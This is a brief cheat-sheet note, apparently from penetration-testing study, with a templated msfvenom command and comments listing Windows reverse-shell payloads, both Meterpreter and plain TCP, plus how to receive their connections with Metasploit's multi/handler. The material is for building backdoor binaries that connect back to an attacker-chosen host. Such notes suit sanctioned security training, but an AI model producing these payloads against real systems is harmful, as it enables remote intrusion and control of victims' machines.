sudo msfvenom -p <PAYLOADTYPE> LHOST=<LHOST> LPORT=<LPORT> -f <FORMAT> -o <OUTFILE>

# IN SUMARY: MSFVenom is a utility from the Metasploit-Framework kit which generates binaries to be executed to craete backdoors.
# From '-p' flag we have the following payloads from x64 Windows hosts:
# - windows/x64/meterpreter_reverse_https (Meterpreter nonstaged payload)
# - windows/x64/meterpreter/reverse_https (Meterpreter staged paylaoad)
# - windows/shell_reverse_tcp (simple nonstaged reverse tcp connection)

# From the first and second option, the connection have to be recovered with multi/handler module from msfconsole setting the PAYLOAD option before launch the listener.